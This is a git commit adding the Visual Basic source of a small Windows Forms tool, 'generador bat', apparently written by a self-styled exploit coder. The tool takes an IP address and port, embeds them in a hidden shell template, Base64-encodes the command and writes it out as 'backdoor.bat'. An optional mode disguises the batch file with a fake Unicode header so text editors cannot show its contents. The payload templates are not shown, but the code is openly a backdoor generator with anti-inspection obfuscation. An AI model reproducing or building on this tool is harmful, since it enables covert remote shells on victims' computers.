c4215399d202da8b6cb6b1599e7163e4c448b0b4
3xploit <30919412+3xploit666@users.noreply.github.com>
2019-04-19 00:57:01 -0400

    Add files via upload

---
+++ generador bat/generador bat/Form1.Designer.vb
@@ -0,0 +1,184 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
+Partial Class Form1
+    Inherits System.Windows.Forms.Form
+
+    'Form reemplaza a Dispose para limpiar la lista de componentes.
+    <System.Diagnostics.DebuggerNonUserCode()> _
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Requerido por el Diseñador de Windows Forms
+    Private components As System.ComponentModel.IContainer
+
+    'NOTA: el Diseñador de Windows Forms necesita el siguiente procedimiento
+    'Se puede modificar usando el Diseñador de Windows Forms.  
+    'No lo modifique con el editor de código.
+    <System.Diagnostics.DebuggerStepThrough()> _
+    Private Sub InitializeComponent()
+        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
+        Me.GhostTheme1 = New generador_bat.GhostTheme()
+        Me.GhostRadiobutton1 = New generador_bat.GhostRadiobutton()
+        Me.TextBox1 = New System.Windows.Forms.TextBox()
+        Me.Button2 = New System.Windows.Forms.Button()
+        Me.Button1 = New System.Windows.Forms.Button()
+        Me.GhostTextBox2 = New generador_bat.GhostTextBox()
+        Me.GhostTextBox1 = New generador_bat.GhostTextBox()
+        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
+        Me.SaveFileDialog1 = New System.Windows.Forms.SaveFileDialog()
+        Me.GhostTheme1.SuspendLayout()
+        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
+        Me.SuspendLayout()
+        '
+        'GhostTheme1
+        '
+        Me.GhostTheme1.BorderStyle = System.Windows.Forms.FormBorderStyle.None
+        Me.GhostTheme1.Colors = New generador_bat.Bloom(-1) {}
+        Me.GhostTheme1.Controls.Add(Me.GhostRadiobutton1)
+        Me.GhostTheme1.Controls.Add(Me.TextBox1)
+        Me.GhostTheme1.Controls.Add(Me.Button2)
+        Me.GhostTheme1.Controls.Add(Me.Button1)
+        Me.GhostTheme1.Controls.Add(Me.GhostTextBox2)
+        Me.GhostTheme1.Controls.Add(Me.GhostTextBox1)
+        Me.GhostTheme1.Controls.Add(Me.PictureBox1)
+        Me.GhostTheme1.Customization = ""
+        Me.GhostTheme1.Dock = System.Windows.Forms.DockStyle.Fill
+        Me.GhostTheme1.Font = New System.Drawing.Font("Verdana", 8.0!)
+        Me.GhostTheme1.Image = Nothing
+        Me.GhostTheme1.Location = New System.Drawing.Point(0, 0)
+        Me.GhostTheme1.Movable = True
+        Me.GhostTheme1.Name = "GhostTheme1"
+        Me.GhostTheme1.NoRounding = False
+        Me.GhostTheme1.ShowIcon = False
+        Me.GhostTheme1.Sizable = True
+        Me.GhostTheme1.Size = New System.Drawing.Size(363, 237)
+        Me.GhostTheme1.SmartBounds = True
+        Me.GhostTheme1.StartPosition = System.Windows.Forms.FormStartPosition.WindowsDefaultLocation
+        Me.GhostTheme1.TabIndex = 0
+        Me.GhostTheme1.Text = "[3xploit c<oder]"
+        Me.GhostTheme1.TransparencyKey = System.Drawing.Color.Fuchsia
+        Me.GhostTheme1.Transparent = False
+        '
+        'GhostRadiobutton1
+        '
+        Me.GhostRadiobutton1.Checked = False
+        Me.GhostRadiobutton1.Colors = New generador_bat.Bloom(-1) {}
+        Me.GhostRadiobutton1.Customization = ""
+        Me.GhostRadiobutton1.Font = New System.Drawing.Font("Verdana", 8.0!)
+        Me.GhostRadiobutton1.Image = Nothing
+        Me.GhostRadiobutton1.Location = New System.Drawing.Point(30, 56)
+        Me.GhostRadiobutton1.Name = "GhostRadiobutton1"
+        Me.GhostRadiobutton1.NoRounding = False
+        Me.GhostRadiobutton1.Size = New System.Drawing.Size(89, 14)
+        Me.GhostRadiobutton1.TabIndex = 1
+        Me.GhostRadiobutton1.Text = "Obfuscation"
+        Me.GhostRadiobutton1.Transparent = False
+        '
+        'TextBox1
+        '
+        Me.TextBox1.BackColor = System.Drawing.Color.Black
+        Me.TextBox1.ForeColor = System.Drawing.Color.Lime
+        Me.TextBox1.Location = New System.Drawing.Point(13, 76)
+        Me.TextBox1.Multiline = True
+        Me.TextBox1.Name = "TextBox1"
+        Me.TextBox1.Size = New System.Drawing.Size(116, 149)
+        Me.TextBox1.TabIndex = 5
+        '
+        'Button2
+        '
+        Me.Button2.BackColor = System.Drawing.Color.Red
+        Me.Button2.Location = New System.Drawing.Point(333, 0)
+        Me.Button2.Name = "Button2"
+        Me.Button2.Size = New System.Drawing.Size(27, 23)
+        Me.Button2.TabIndex = 4
+        Me.Button2.Text = "X"
+        Me.Button2.UseVisualStyleBackColor = False
+        '
+        'Button1
+        '
+        Me.Button1.Location = New System.Drawing.Point(250, 183)
+        Me.Button1.Name = "Button1"
+        Me.Button1.Size = New System.Drawing.Size(66, 23)
+        Me.Button1.TabIndex = 3
+        Me.Button1.Text = "Generar"
+        Me.Button1.UseVisualStyleBackColor = True
+        '
+        'GhostTextBox2
+        '
+        Me.GhostTextBox2.Customization = "/////wAAAP8AAAD/Wlpa/w=="
+        Me.GhostTextBox2.Font = New System.Drawing.Font("Verdana", 8.0!)
+        Me.GhostTextBox2.Image = Nothing
+        Me.GhostTextBox2.Location = New System.Drawing.Point(224, 138)
+        Me.GhostTextBox2.MaxLength = 32767
+        Me.GhostTextBox2.Multiline = False
+        Me.GhostTextBox2.Name = "GhostTextBox2"
+        Me.GhostTextBox2.NoRounding = False
+        Me.GhostTextBox2.ReadOnly = False
+        Me.GhostTextBox2.Size = New System.Drawing.Size(116, 24)
+        Me.GhostTextBox2.TabIndex = 2
+        Me.GhostTextBox2.Text = "PORT"
+        Me.GhostTextBox2.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
+        Me.GhostTextBox2.Transparent = False
+        Me.GhostTextBox2.UseSystemPasswordChar = False
+        '
+        'GhostTextBox1
+        '
+        Me.GhostTextBox1.Customization = "/////wAAAP8AAAD/Wlpa/w=="
+        Me.GhostTextBox1.Font = New System.Drawing.Font("Verdana", 8.0!)
+        Me.GhostTextBox1.Image = Nothing
+        Me.GhostTextBox1.Location = New System.Drawing.Point(224, 87)
+        Me.GhostTextBox1.MaxLength = 32767
+        Me.GhostTextBox1.Multiline = False
+        Me.GhostTextBox1.Name = "GhostTextBox1"
+        Me.GhostTextBox1.NoRounding = False
+        Me.GhostTextBox1.ReadOnly = False
+        Me.GhostTextBox1.Size = New System.Drawing.Size(116, 24)
+        Me.GhostTextBox1.TabIndex = 1
+        Me.GhostTextBox1.Text = "IP"
+        Me.GhostTextBox1.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
+        Me.GhostTextBox1.Transparent = False
+        Me.GhostTextBox1.UseSystemPasswordChar = False
+        '
+        'PictureBox1
+        '
+        Me.PictureBox1.Image = CType(resources.GetObject("PictureBox1.Image"), System.Drawing.Image)
+        Me.PictureBox1.Location = New System.Drawing.Point(3, 25)
+        Me.PictureBox1.Name = "PictureBox1"
+        Me.PictureBox1.Size = New System.Drawing.Size(357, 209)
+        Me.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
+        Me.PictureBox1.TabIndex = 0
+        Me.PictureBox1.TabStop = False
+        '
+        'Form1
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.ClientSize = New System.Drawing.Size(363, 237)
+        Me.Controls.Add(Me.GhostTheme1)
+        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
+        Me.Name = "Form1"
+        Me.Text = "Form1"
+        Me.TransparencyKey = System.Drawing.Color.Fuchsia
+        Me.GhostTheme1.ResumeLayout(False)
+        Me.GhostTheme1.PerformLayout()
+        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
+        Me.ResumeLayout(False)
+
+    End Sub
+
+    Friend WithEvents GhostTheme1 As GhostTheme
+    Friend WithEvents Button1 As Button
+    Friend WithEvents GhostTextBox2 As GhostTextBox
+    Friend WithEvents GhostTextBox1 As GhostTextBox
+    Friend WithEvents PictureBox1 As PictureBox
+    Friend WithEvents Button2 As Button
+    Friend WithEvents TextBox1 As TextBox
+    Friend WithEvents SaveFileDialog1 As SaveFileDialog
+    Friend WithEvents GhostRadiobutton1 As GhostRadiobutton
+End Class
---
+++ generador bat/generador bat/Form1.vb
@@ -0,0 +1,71 @@
+﻿Imports System.Text
+
+Public Class Form1
+    Dim блмацрагзаваттатуреа As New StringBuilder
+    Dim alphaChars As String = "abcdefghijklmnopqrstuvwxyz"
+    Dim randomGenerator As New Random
+
+    '3xploit coder ==================================$==============================================
+    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
+        Close()
+    End Sub
+    '3xploit coder ==================================$==============================================
+    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
+
+        My.Computer.Audio.Play(My.Resources.Alert, AudioPlayMode.Background)
+        '3xploit coder ==================================$==============================================
+
+        Dim a As New SaveFileDialog()
+        '3xploit coder ==================================$==============================================
+        a.FileName = "backdoor.bat"
+        If (a.ShowDialog = Windows.Forms.DialogResult.OK) Then
+
+
+            Dim f As String = My.Resources.shell
+            f = f.Replace("%H%", GhostTextBox1.Text).Replace("%P%", GhostTextBox2.Text)
+            Dim o = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(f))
+            Dim exploit As String = My.Resources.code2
+            exploit = exploit.Replace("%HHH%", o)
+            TextBox1.Text = exploit
+            System.IO.File.WriteAllText(a.FileName, exploit, System.Text.Encoding.ASCII)
+            If GhostRadiobutton1.Checked = True Then
+                ObfuscateMethod3()
+                MessageBox.Show("3xploit coder complete.........")
+
+
+                '3xploit coder ==================================$=============================================='3xploit coder ==================================$==============================================
+
+            End If
+        End If
+    End Sub
+    Private Sub ObfuscateMethod3()
+        TextBox1.ReadOnly = True
+        '3xploit coder ==================================$==============================================
+        блмацрагзаваттатуреа.Clear() ' Make sure there is no excess code left over from last time.
+        '3xploit coder ==================================$==============================================
+        Dim unicodeHeader() As Byte = New Byte() {&HFF, &HFE, &HD, &HA} ' The bytes that make text editors think it's in Unicode
+        Dim obfuscatedCodeByteArray() As Byte = New Byte() {} ' Declare new Byte array for our text to be obfuscated.
+        obfuscatedCodeByteArray = System.Text.Encoding.ASCII.GetBytes("cls" + vbNewLine + TextBox1.Text) ' Put TextBox1.Text into byte array
+        Dim concatenatedByteArray() As Byte = New Byte(unicodeHeader.Length + obfuscatedCodeByteArray.Length) {} ' Make new array to combine header and code
+
+        unicodeHeader.CopyTo(concatenatedByteArray, 0) ' Copy header to full byte array
+        obfuscatedCodeByteArray.CopyTo(concatenatedByteArray, unicodeHeader.Length) ' Copy obfuscated code after the header
+
+        TextBox1.ReadOnly = False
+        ' Need a custom save function because have to write raw bytes to disk.
+        If SaveFileDialog1.ShowDialog() = DialogResult.OK Then
+            IO.File.WriteAllBytes(SaveFileDialog1.FileName, concatenatedByteArray) ' Write raw bytes, not just text, to the disk.
+        Else
+            Return
+        End If
+    End Sub
+    '3xploit coder ==================================$==============================================
+    Private Function SaveFile() As Boolean ' Returns true if DialogResult OK, false otherwise
+        If SaveFileDialog1.ShowDialog() = DialogResult.OK Then
+            IO.File.WriteAllText(SaveFileDialog1.FileName, блмацрагзаваттатуреа.ToString)
+            Return True
+        Else
+            Return False
+        End If
+    End Function
+End Class
